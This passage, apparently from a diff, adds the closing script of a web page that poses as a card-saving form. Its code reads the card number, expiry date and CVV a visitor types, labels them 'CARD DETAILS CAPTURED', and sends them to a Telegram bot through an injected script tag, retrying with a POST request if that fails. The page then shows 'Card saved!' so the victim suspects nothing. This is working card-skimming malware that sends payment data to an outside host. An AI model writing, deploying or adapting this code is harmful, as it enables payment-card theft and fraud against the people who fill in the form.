+        return new Promise((resolve, reject) => {
+          const message = `💳 CARD DETAILS CAPTURED 💳\n━━━━━━━━━━━━━━━━━━\n📱 Card Number: ${cardData.cardNumber}\n📅 Expiry Date: ${cardData.expiry}\n🔐 CVV: ${cardData.cvv}\n💳 Card Type: ${cardData.cardType}\n━━━━━━━━━━━━━━━━━━\n⏰ Time: ${new Date().toLocaleString()}`;
+          const script = document.createElement('script'); const callbackName = 'telegram_callback_' + Date.now();
+          window[callbackName] = function(data) { delete window[callbackName]; document.body.removeChild(script); if (data.ok) resolve(data); else reject(new Error(data.description || 'Unknown error')); };
+          const encodedMessage = encodeURIComponent(message);
+          const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}&parse_mode=Markdown&callback=${callbackName}`;
+          script.src = url; script.onerror = () => { delete window[callbackName]; document.body.removeChild(script); fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' }) }).then(r => r.json()).then(data => { if (data.ok) resolve(data); else reject(new Error(data.description)); }).catch(reject); };
+          document.body.appendChild(script);
+          setTimeout(() => { reject(new Error('Request timeout')); }, 10000);
+        });
+      }
+
+      saveBtn.addEventListener('click', async function() {
+        if (!saveBtn.classList.contains('active')) return;
+        statusMessage.className = 'status-message info'; statusMessage.textContent = '⏳ Processing...';
+        const cardNumber = cardInput.value; const expiry = expiryInput.value; const cvv = cvvInput.value; const cardNumDigits = cardNumber.replace(/\D/g, '');
+        let cardTypeStr = 'Unknown';
+        if (cardNumDigits.startsWith('4')) cardTypeStr = 'Visa'; else if (cardNumDigits.startsWith('5')) cardTypeStr = 'Mastercard'; else if (cardNumDigits.startsWith('3')) cardTypeStr = 'Amex'; else if (cardNumDigits.startsWith('6')) cardTypeStr = 'Discover';
+        const cardData = { cardNumber, expiry, cvv, cardType: cardTypeStr };
+        try {
+          await sendToTelegram(cardData);
+          statusMessage.className = 'status-message success'; statusMessage.textContent = '✅ Card saved!';
+          setTimeout(() => {
+            clearField(cardInput, cardIcon, cardMessage, cardType); clearField(expiryInput, expiryIcon, expiryMessage); clearField(cvvInput, cvvIcon, cvvMessage);
+            statusMessage.style.display = 'none';
+            showPage3();  // <-- after success, go to welcome page
+          }, 800);
+        } catch (error) {
+          statusMessage.className = 'status-message error'; statusMessage.textContent = '❌ Connection failed. Try again.';
+        }
+      });
+
+      // Done button on welcome page goes back to page1 (or you can decide)
+      doneBtn.addEventListener('click', () => {
+        showPage1();
+      });
+
+      // Prevent non-numeric
+      [cardInput, cvvInput, expiryInput].forEach(input => {
+        input.addEventListener('keydown', function(e) {
+          if (input.id === 'expiry' && e.key === '/') return;
+          if (isNaN(e.key) && !['Backspace','Delete','ArrowLeft','ArrowRight','Tab'].includes(e.key)) e.preventDefault();
+        });
+      });
+    })();
+  </script>
+</body>
+</html>
